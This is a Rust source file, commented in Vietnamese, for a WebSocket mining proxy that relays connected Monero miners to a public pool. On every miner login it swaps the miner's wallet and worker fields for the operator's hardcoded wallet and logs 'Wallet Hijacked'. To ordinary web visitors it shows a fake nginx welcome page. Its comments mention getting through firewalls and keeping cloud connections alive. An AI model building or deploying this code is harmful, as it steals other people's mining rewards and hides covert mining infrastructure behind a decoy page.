use axum::{
    extract::{WebSocketUpgrade, ws::{Message, WebSocket}, State},
    response::{Html, IntoResponse, Response},
    routing::get,
    Router,
};
use std::{sync::{Arc, atomic::{AtomicUsize, Ordering}}, net::SocketAddr, time::Duration};
use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt, AsyncBufReadExt, BufReader};
use tokio::sync::mpsc::{self, UnboundedSender};
use futures_util::{StreamExt, SinkExt};
use serde_json::Value;
use colored::*;
use chrono::Utc;

// =================================================================
// ⚡ CẤU HÌNH TỐI ƯU (SỬA VÍ CỦA BẠN)
// =================================================================
const LISTEN_ADDR: &str = "0.0.0.0:8080";

// SupportXMR Port 80 để xuyên Firewall tốt nhất. 
// Nếu port 80 không ổn định, thử port 3333 hoặc 5555.
const REAL_POOL_ADDR: &str = "pool.supportxmr.com:3333";

// Ví của bạn
const MY_WALLET: &str = "44hQZfLkTccVGood4aYMTm1KPyJVoa9esLyq1bneAvhkchQdmFTx3rsD3KRwpXTUPd1iTF4VVGYsTCLYrxMZVsvtKqAmBiw";

// Tên Worker (Nên đặt ngắn gọn)
const MY_WORKER: &str = "Ultra_Proxy";

const NGINX_WELCOME: &str = r#"<!DOCTYPE html><html><head><title>Welcome to nginx!</title><style>body{width:35em;margin:0 auto;font-family:Tahoma,Verdana,Arial,sans-serif;}</style></head><body><h1>Welcome to nginx!</h1><p>If you see this page, the nginx web server is successfully installed and working.</p></body></html>"#;

// Biến toàn cục đếm Share (Không dùng lazy_static để tránh lỗi build)
static TOTAL_SENT: AtomicUsize = AtomicUsize::new(0);
static TOTAL_ACCEPTED: AtomicUsize = AtomicUsize::new(0);

enum LogEvent {
    ShareSent,
    ShareAccepted,
    PoolError(String),
    WalletSwapped,
    ClientDisconnected,
}

#[tokio::main]
async fn main() {
    // Tắt log debug hệ thống để dồn tài nguyên cho mạng
    tracing_subscriber::fmt().with_max_level(tracing::Level::ERROR).init();

    let (log_tx, mut log_rx) = mpsc::unbounded_channel::<LogEvent>();
    
    // Luồng Log riêng biệt (Không ảnh hưởng tốc độ đào)
    tokio::spawn(async move {
        while let Some(event) = log_rx.recv().await {
            let time = Utc::now().format("%H:%M:%S");
            match event {
                LogEvent::ShareSent => { 
                    // Log này quá nhiều, tắt đi để tối ưu
                }
                LogEvent::ShareAccepted => {
                    let sent = TOTAL_SENT.load(Ordering::Relaxed);
                    let accepted = TOTAL_ACCEPTED.load(Ordering::Relaxed);
                    let ratio = if sent > 0 { (accepted as f64 / sent as f64) * 100.0 } else { 0.0 };
                    
                    println!("{} [{}] GLOBAL STATS: {} Accepted / {} Sent ({:.2}%)", 
                        "✅".green().bold(), time, accepted, sent, ratio);
                }
                LogEvent::PoolError(err) => {
                    println!("{} [{}] POOL ERROR: {}", "❌".red().bold(), time, err);
                }
                LogEvent::WalletSwapped => {
                    println!("{} [{}] New Miner Connected -> Wallet Hijacked", "💀".magenta(), time);
                }
                LogEvent::ClientDisconnected => {
                    // println!("{} Miner Disconnected", "🔌".yellow());
                }
            }
        }
    });

    let app = Router::new()
        .route("/", get(mining_handler))
        .route("/*path", get(mining_handler)) 
        .with_state(log_tx);

    let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
    
    println!("{}", "========================================".green());
    println!("{} {}", "⚡ ULTRA-PERF PROXY RUNNING ON".green().bold(), addr);
    println!("🔗 Pool: {}", REAL_POOL_ADDR.cyan());
    println!("💰 Wallet: {}", MY_WALLET.yellow());
    println!("{}", "========================================".green());

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

async fn mining_handler(
    ws: Option<WebSocketUpgrade>,
    State(log_tx): State<UnboundedSender<LogEvent>>,
) -> Response {
    match ws {
        Some(w) => w.on_upgrade(move |socket| mining_tunnel(socket, log_tx)),
        None => Html(NGINX_WELCOME).into_response()
    }
}

async fn mining_tunnel(socket: WebSocket, log_tx: UnboundedSender<LogEvent>) {
    // 1. Kết nối Pool (Timeout 5s)
    let tcp_stream = match tokio::time::timeout(Duration::from_secs(5), TcpStream::connect(REAL_POOL_ADDR)).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            let _ = log_tx.send(LogEvent::PoolError(format!("Connect Failed: {}", e)));
            return;
        },
        Err(_) => {
            let _ = log_tx.send(LogEvent::PoolError("Connect Timeout".to_string()));
            return;
        }
    };

    // 🔥 TỐI ƯU MẠNG: Tắt Nagle để gửi gói tin tức thì
    if let Err(_) = tcp_stream.set_nodelay(true) {}

    let (read_half, mut pool_write) = tcp_stream.into_split();
    // Buffer 16KB là điểm ngọt (Sweet spot) cho JSON Stratum
    let mut pool_reader = BufReader::with_capacity(16 * 1024, read_half);
    let (mut ws_write, mut ws_read) = socket.split();

    // ------------------------------------------------------------------
    // LUỒNG 1: MINER -> POOL (CRITICAL PATH)
    // ------------------------------------------------------------------
    let log_tx_miner = log_tx.clone();
    let client_to_server = tokio::spawn(async move {
        while let Some(Ok(msg)) = ws_read.next().await {
            match msg {
                Message::Text(text) => {
                    // Tách dòng để xử lý chuẩn xác
                    for line in text.lines() {
                        let trimmed = line.trim();
                        if trimmed.is_empty() { continue; }

                        let mut final_msg = trimmed.to_string();
                        let mut is_login = false;

                        // 1. INTERCEPT LOGIN (Chỉ làm 1 lần)
                        if trimmed.contains("login") || trimmed.contains("Login") {
                            // Chỉ parse JSON khi thực sự cần thiết (Tiết kiệm CPU)
                            if let Ok(mut json) = serde_json::from_str::<Value>(trimmed) {
                                let mut modified = false;
                                if let Some(params) = json.get_mut("params") {
                                    if let Some(obj) = params.as_object_mut() {
                                        obj.insert("login".to_string(), serde_json::json!(MY_WALLET));
                                        obj.insert("user".to_string(), serde_json::json!(MY_WALLET));
                                        obj.insert("pass".to_string(), serde_json::json!(MY_WORKER));
                                        obj.insert("rigid".to_string(), serde_json::json!(MY_WORKER));
                                        modified = true;
                                    } else if let Some(arr) = params.as_array_mut() {
                                        if !arr.is_empty() { 
                                            arr[0] = serde_json::json!(MY_WALLET); 
                                            modified = true; 
                                        }
                                    }
                                }
                                if modified {
                                    final_msg = json.to_string();
                                    is_login = true;
                                }
                            }
                        }

                        // 2. GỬI ĐI NGAY LẬP TỨC (Zero Latency)
                        final_msg.push('\n'); // Stratum bắt buộc
                        if pool_write.write_all(final_msg.as_bytes()).await.is_err() { return; }
                        
                        // 3. THỐNG KÊ (Làm sau khi đã gửi để ko chặn luồng mạng)
                        if is_login {
                            let _ = log_tx_miner.send(LogEvent::WalletSwapped);
                        }
                        if trimmed.contains("submit") {
                            TOTAL_SENT.fetch_add(1, Ordering::Relaxed);
                            let _ = log_tx_miner.send(LogEvent::ShareSent);
                        }
                    }
                    
                    // 🔥 FLUSH AGGRESSIVELY: Đẩy gói tin đi ngay, không chờ buffer đầy
                    // Đây là chìa khóa để Miner không bị timeout trên Cloud
                    if pool_write.flush().await.is_err() { break; }
                },
                // Giữ kết nối Cloud không bị idle
                Message::Ping(_) => {}, 
                Message::Pong(_) => {},
                Message::Binary(_) => {},
                Message::Close(_) => break,
            }
        }
    });

    // ------------------------------------------------------------------
    // LUỒNG 2: POOL -> MINER (FAST FORWARD)
    // ------------------------------------------------------------------
    let log_tx_pool = log_tx.clone();
    let server_to_client = tokio::spawn(async move {
        // Tái sử dụng buffer để tiết kiệm RAM
        let mut line_buffer = String::with_capacity(2048);
        loop {
            line_buffer.clear();
            match pool_reader.read_line(&mut line_buffer).await {
                Ok(0) => break, // EOF -> Pool đóng kết nối
                Ok(_) => {
                    // 1. Gửi về Miner ngay
                    if ws_write.send(Message::Text(line_buffer.clone())).await.is_err() { break; }

                    // 2. Check lỗi (để debug nếu miner bị tắt)
                    if line_buffer.contains("error") && !line_buffer.contains("null") {
                        if let Ok(json) = serde_json::from_str::<Value>(&line_buffer) {
                             if let Some(err) = json.get("error") {
                                 if !err.is_null() {
                                     let err_msg = err["message"].as_str().unwrap_or("Unknown").to_string();
                                     let _ = log_tx_pool.send(LogEvent::PoolError(err_msg));
                                 }
                             }
                        }
                    }

                    // 3. Đếm Share Accepted
                    if line_buffer.contains("OK") && line_buffer.contains("result") {
                         TOTAL_ACCEPTED.fetch_add(1, Ordering::Relaxed);
                         let _ = log_tx_pool.send(LogEvent::ShareAccepted);
                    }
                }
                Err(_) => break,
            }
        }
    });

    let _ = tokio::select! { _ = client_to_server => {}, _ = server_to_client => {} };
    let _ = log_tx.send(LogEvent::ClientDisconnected);
}
